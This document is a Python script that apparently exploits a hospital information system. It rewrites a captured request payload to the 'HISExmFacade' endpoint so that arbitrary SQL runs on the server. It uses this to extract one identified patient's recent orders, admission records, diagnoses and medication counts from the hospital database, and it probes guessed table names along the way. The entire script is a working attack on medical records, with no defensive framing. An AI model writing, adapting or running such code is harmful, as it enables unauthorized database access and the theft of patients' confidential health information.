from his_client_final import HISClient
import sys, re

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')

c = HISClient()

def execute_sql(sql_query):
    import zlib, os, requests
    template_path = "HISExmFacade_payload_0.bin"
    if not os.path.exists(template_path): return None
    with open(template_path, "rb") as f:
        compressed_template = f.read()
    try: decompressed = zlib.decompress(compressed_template)
    except: decompressed = compressed_template
    original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
    target_len = len(original_sql_bytes)
    padded_sql = sql_query.ljust(target_len)
    patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
    resp = requests.post(f"{c.base_url}/HISExmFacade", data=zlib.compress(patched_payload), headers=c.headers)
    if resp.status_code == 200:
        return zlib.decompress(resp.content).decode('utf-8', errors='ignore')
    return None

def parse_rows(text, tag="DRMODIFY"):
    if not text: return []
    rows = re.findall(f'<{tag}[^>]*>(.*?)</{tag}>', text, re.DOTALL)
    out = []
    for r in rows:
        fields = re.findall(r'<(\w+)>(.*?)</\1>', r)
        out.append({k: v for k, v in fields})
    return out

target = "003380272B"

# Fetch a limited set of recent orders
print(f"[*] Fetching top 100 recent orders for {target} from OPDORDM...")
q = f"SELECT * FROM (SELECT * FROM OPDUSR.OPDORDM WHERE HHISNUM = '{target}' ORDER BY BEGINDATETIME DESC) WHERE ROWNUM <= 100"
res = execute_sql(q)
rows = parse_rows(res)

if rows:
    # Group by OPDCASENO
    cases = {}
    for r in rows:
        cn = r.get('OPDCASENO')
        if cn not in cases: cases[cn] = []
        cases[cn].append(r)
    
    # Check each case against PAT_ADM_CASE
    print(f"[+] Found {len(cases)} unique cases in the last 100 orders.")
    for cn, items in cases.items():
        q_check = f"SELECT * FROM SYSTEM.PAT_ADM_CASE WHERE HCASENO = '{cn}'"
        res_check = execute_sql(q_check)
        adm_rows = parse_rows(res_check)
        
        if adm_rows:
            a = adm_rows[0]
            print(f"  Case {cn}: ADMISSION ({a.get('HINCURSVCL')}) - {a.get('HADMDT')}")
            print(f"    - Diagnosis: {a.get('HINDIAG')}")
            # Count meds
            meds = [i for i in items if i.get('ORTYPE') == 'OD']
            print(f"    - Medications: {len(meds)}")
        else:
            print(f"  Case {cn}: OUTPATIENT?")
            print(f"    - First order: {items[0].get('PFNM')} ({items[0].get('ORTYPE')}) @ {items[0].get('BEGINDATETIME')}")
            # Try to find diagnosis for this case
            diag_probes = ['OPD_DIAG', 'PAT_DIAG', 'OPD_CASE', 'PAT_OPD_MAIN']
            for p in diag_probes:
                 try:
                     res_d = execute_sql(f"SELECT * FROM {p} WHERE OPDCASENO = '{cn}'") or execute_sql(f"SELECT * FROM {p} WHERE CASENO = '{cn}'")
                     diag_rows = parse_rows(res_d)
                     if diag_rows:
                         print(f"    [+] Found diagnosis in {p}: {diag_rows[0].get('DIAGNOSIS') or diag_rows[0].get('HINDIAG')}")
                         break
                 except: pass
else:
    print("[-] No orders found.")
